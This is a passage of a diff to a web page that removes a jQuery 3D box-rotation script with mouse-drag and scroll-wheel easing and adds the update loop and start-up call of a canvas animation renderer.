-        timer && clearInterval(timer);
-  
-        // 鼠标弹起后有缓动效果
-        timer = setInterval(_ => {
-          // 缓动差值 
-          minusX *= 0.95;
-          minusY *= 0.95;
-
-          // 计算X、Y轴的移动度数
-          liElemDegX -= minusY*0.1;
-          liElemDegY += minusX*0.1;
-
-          // 当差值超出指定范围时，则清除定时器
-          Math.abs(minusX)<0.05
-          && Math.abs(minusY)<0.05
-          && clearInterval(timer);
-
-          $('#box').css({
-            "transform":`translateZ(${liElemDepZ}px) rotateX(${liElemDegX}deg) rotateY(${liElemDegY}deg)`
-          })
-        }, 12);
-      })
-
-    }).on('mousewheel DOMMouseScroll',e =>{
-        // 若上一个定时器存在，则将其删除
-        timer && clearInterval(timer);
-
-        // 获取鼠标滚动方向
-        let step = (e.originalEvent.wheelDelta
-        && (e.originalEvent.wheelDelta >0?1:-1))
-        || (e.originalEvent.detail && (e.originalEvent.detail >0?-1:1));
-
-        // 计算滚轮滚动时Z 轴景深的步长
-        liElemDepZ = depDefault += step*90;
-
-        $('#box').css({
-          "transform":`translateZ(${liElemDepZ}px) rotateX(${liElemDegX}deg) rotateY(${liElemDegY}deg)`
-        })
-
-        // 设置缓动效果
-        timer = setInterval(_ => {
-          // 缓动步长
-          step *= 0.6;
-          liElemDepZ += step*80;
-
-          Math.abs(step) < 0.000005
-          && clearInterval(timer);
-
-          $('#box').css({
-            "transform":`translateZ(${liElemDepZ}px) rotateX(${liElemDegX}deg) rotateY(${liElemDegY}deg)`
-          })
-        }, 12);
-      })
-
-    // 加载布局
-    setTimeout(gridLayout,1000);
-  }
-
-  main();
-
-})();
-</script>
-</body>
+          if (this.y <= -this.renderer.height / 4) {
+            if (!this.endTheta) {
+              for (
+                var theta = Math.PI / 2, end = (Math.PI * 3) / 2;
+                theta <= end;
+                theta += Math.PI
+              ) {
+                if (this.theta < theta && this.theta + Math.PI / 200 > theta) {
+                  this.theta = theta;
+                  this.endTheta = true;
+                  break;
+                }
+              }
+            }
+            if (!this.endPhi) {
+              for (
+                var phi = Math.PI / 8, end = (Math.PI * 7) / 8;
+                phi <= end;
+                phi += (Math.PI * 3) / 4
+              ) {
+                if (this.phi < phi && this.phi + Math.PI / 200 > phi) {
+                  this.phi = Math.PI / 8;
+                  this.endPhi = true;
+                  break;
+                }
+              }
+            }
+          }
+          if (!this.endTheta) {
+            if (axis.y == this.thresholdY) {
+              this.theta +=
+                (Math.PI / 200) *
+                (this.theta < Math.PI / 2 ||
+                (this.theta >= Math.PI && this.theta < (Math.PI * 3) / 2)
+                  ? 1
+                  : -1);
+            } else {
+              this.theta += Math.PI / 500;
+            }
+            this.theta %= Math.PI * 2;
+          }
+          if (this.endPhi) {
+            if (this.rippleCount == this.MAX_RIPPLE_COUNT) {
+              this.psi += this.dpsi;
+              this.psi %= Math.PI * 2;
+            }
+          } else {
+            this.phi += Math.PI / (axis.y == this.thresholdY ? 200 : 500);
+            this.phi %= Math.PI;
+          }
+          if (this.y <= -this.renderer.height * this.SURFACE_RATE) {
+            this.x += 2;
+            this.y = -this.renderer.height * this.SURFACE_RATE;
+          } else {
+            this.x += this.vx;
+            this.y += this.vy;
+          }
+          return (
+            this.z > -this.FOCUS_POSITION &&
+            this.z < this.FAR_LIMIT &&
+            this.x < this.renderer.width * 1.5
+          );
+        }
+      };
+    </script>
+    <script>
+      RENDERER.init();
+    </script>
+  </body>
 </html>
